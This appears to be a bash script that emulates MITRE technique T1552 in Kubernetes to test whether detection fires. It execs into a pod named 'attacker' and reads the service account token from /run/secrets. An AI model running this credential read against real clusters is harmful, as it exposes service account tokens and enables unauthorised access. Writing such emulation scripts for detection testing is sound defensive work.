#!/bin/bash

echo "[*] Scenario 2: T1552 - Secret Access via API"
echo "[*] Attack: Attempt to read secrets from K8s API"
echo "[*] Expected: T1552 alert (stubbed, won't fire without audit logs)"

TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "[$TIMESTAMP] ATTACK_START: Secret access attempt"

kubectl exec -it attacker -- bash << 'SHELL'
echo "Attempting to read service account token..."
cat /run/secrets/kubernetes.io/serviceaccount/token
echo ""
echo "Token read successfully (credential access)"
SHELL

TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "[$TIMESTAMP] ATTACK_END: Credential access complete"
